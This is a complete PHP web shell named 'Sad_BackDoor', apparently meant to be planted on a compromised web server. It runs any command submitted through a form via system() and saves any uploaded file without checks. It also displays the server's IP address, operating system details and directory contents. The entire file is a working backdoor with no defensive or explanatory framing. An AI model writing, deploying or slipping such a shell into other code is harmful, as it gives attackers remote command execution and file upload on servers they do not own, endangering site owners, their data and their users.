<?php
	if ($_SERVER['REQUEST_METHOD'] == 'POST'){
		@$up = $_FILES['uplode']['name'];
		@$avatarTmp	= $_FILES['uplode']['tmp_name'];
		move_uploaded_file($avatarTmp,$up);
		echo $up;
	}
?>
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title>Sad_BackDoor</title>
		<style>
			body{
				background-image: url('https://2.top4top.net/p_1352pfg551.jpg');
				background-size: 1400px 700px;
			}h1,h3,a{
				color: gray;
			}textarea{
				width: 500px;
				height: 270px;
    			color: #FFF;
    			background: transparent;
			}#fuck{
				width: 235px;
				height: 30px;
			}
		</style>
	</head>
	<body>
		<center>
		<h1><font color="green">Hi My Name's Sad U R Welcome : </font><i><?php echo $_SERVER["REMOTE_ADDR"]?></i></h1>
		<h3>
			My target is : <script>document.write(document.domain)</script><br>
			<?php
				echo 'Server IP :'.getHostByName(getHostName()).'<br>';
				echo 'Operating System : '.php_uname('s').'<br>';
				echo 'Release Name : '.php_uname('r').'<br>';
				echo 'Version : '.php_uname('v').'<br>';
				echo 'Machine Type : '.php_uname('m').'<br>';
				echo 'Your path : '.__DIR__.'<br>'.'######################################'.'<br>';
				if ($dh = opendir(__DIR__)){
					while (($file = readdir($dh)) !== false){
						echo $file . "<br>";
					}closedir($dh);
				}
			?>
		</h3>
		<form method="POST">
		<input id ="fuck" type="text" name="commend" title="Enter your commend here" placeholder="Enter the commend">
		<br><br>
		</form>
		<textarea>
			<?php
				@system($_POST['commend']);
			?>
		</textarea>
		<br><br>
		<form method="POST" action="<?php echo $_SERVER['PHP_SELF'] ?>" enctype="multipart/form-data">
			<input type="file" name="uplode">
			<input type="submit">
		</form></center><a href="https://twitter.com/AhmedMosaa18">Connect with me</a></body></html>
